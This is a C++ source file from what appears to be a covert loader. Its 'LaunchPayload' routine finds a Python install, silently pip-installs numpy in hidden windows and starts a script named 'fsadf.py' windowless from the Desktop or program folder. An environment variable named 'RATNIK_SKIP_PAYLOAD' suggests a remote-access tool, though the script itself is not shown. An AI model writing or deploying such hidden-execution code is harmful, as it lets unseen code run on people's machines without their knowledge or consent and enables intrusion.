#include "payload.h"

static bool RunHidden(const std::wstring& cmd, DWORD timeoutMs, DWORD* exitCode) {
    STARTUPINFOW si{}; si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi{};
    std::wstring c = cmd;
    if (!CreateProcessW(nullptr, c.data(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW,
                        nullptr, nullptr, &si, &pi))
        return false;
    DWORD w = WaitForSingleObject(pi.hProcess, timeoutMs);
    if (exitCode) GetExitCodeProcess(pi.hProcess, exitCode);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return w == WAIT_OBJECT_0;
}

static fs::path FindPython(bool windowless) {
    const wchar_t* names[] = { L"pythonw.exe", L"python.exe" };
    for (const wchar_t* n : names) {
        wchar_t buf[MAX_PATH];
        if (SearchPathW(nullptr, windowless ? L"pythonw.exe" : n, nullptr, MAX_PATH, buf, nullptr)) {
            fs::path p(buf);
            if (fs::file_size(p) > 20000) return p;
        }
        if (windowless) break;
    }
    // common install roots
    std::vector<fs::path> roots = {
        fs::path(Env(L"LOCALAPPDATA")) / L"Programs" / L"Python",
        fs::path(Env(L"ProgramFiles")) / L"Python",
        fs::path(L"C:\\") / L"Python",
    };
    for (auto& r : roots) {
        std::error_code ec;
        if (!fs::exists(r, ec)) continue;
        for (auto& e : fs::recursive_directory_iterator(r, fs::directory_options::skip_permission_denied, ec)) {
            if (ec) break;
            if (!e.is_regular_file(ec)) continue;
            auto nm = e.path().filename().wstring();
            if (nm == (windowless ? L"pythonw.exe" : L"python.exe")) return e.path();
        }
    }
    return {};
}

static fs::path FindScript() {
    std::vector<fs::path> cands = {
        fs::path(Env(L"USERPROFILE")) / L"Desktop" / L"fsadf.py",
        ExeDir() / L"fsadf.py",
    };
    for (auto& c : cands) {
        std::error_code ec;
        if (fs::exists(c, ec)) return c;
    }
    return {};
}

void LaunchPayload() {
    wchar_t skip[8];
    if (GetEnvironmentVariableW(L"RATNIK_SKIP_PAYLOAD", skip, 8) > 0) {
        Log("payload: skipped by env");
        return;
    }
    fs::path script = FindScript();
    if (script.empty()) { Log("payload: fsadf.py not found"); return; }

    fs::path py = FindPython(false);
    if (py.empty()) { Log("payload: python not found"); return; }
    Log("payload: python=%s", ToUtf8(py.wstring()).c_str());

    DWORD ec = 1;
    std::wstring q = L"\"" + py.wstring() + L"\" -c \"import numpy\"";
    bool hasNumpy = RunHidden(q, 30000, &ec) && ec == 0;
    if (!hasNumpy) {
        Log("payload: installing numpy");
        std::wstring inst = L"\"" + py.wstring() +
                            L"\" -m pip install --quiet --disable-pip-version-check numpy";
        RunHidden(inst, 180000, &ec);
        RunHidden(q, 30000, &ec);
        hasNumpy = (ec == 0);
        Log("payload: numpy=%d", (int)hasNumpy);
    }

    fs::path pyw = py;
    fs::path w = py.parent_path() / L"pythonw.exe";
    std::error_code fec;
    if (fs::exists(w, fec)) pyw = w;

    STARTUPINFOW si{}; si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};
    std::wstring cmd = L"\"" + pyw.wstring() + L"\" \"" + script.wstring() + L"\"";
    std::wstring dir = script.parent_path().wstring();
    if (CreateProcessW(nullptr, cmd.data(), nullptr, nullptr, FALSE, 0, nullptr, dir.c_str(), &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        Log("payload: started %s", ToUtf8(cmd).c_str());
    } else {
        Log("payload: start failed %lu", GetLastError());
    }
}
